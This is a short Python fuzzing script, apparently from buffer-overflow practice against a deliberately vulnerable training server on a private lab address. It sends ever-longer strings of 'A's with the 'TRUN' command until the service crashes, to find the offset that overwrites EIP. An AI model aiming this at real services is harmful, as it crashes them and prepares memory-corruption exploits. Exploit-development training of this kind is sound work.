import socket
from time import sleep
import sys

#sending chars to find approximate value to pass EIP
numberofcharacters = 100
stringtosend = "TRUN /.:/" + "A" * numberofcharacters

while True:
    try:
        mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        mysocket.connect(("10.0.2.15", 9999))
        bytes = stringtosend.encode(encoding="latin1")
        mysocket.send(bytes)
        mysocket.close()
        stringtosend = stringtosend + "A" * numberofcharacters
        sleep(1)
    except KeyboardInterrupt:
        print("Crashed at :" + str(len(stringtosend)))
        sys.exit()
    except Exception as e:
        print("Crashed at :" + str(len(stringtosend)))
        print(e)
        sys.exit()
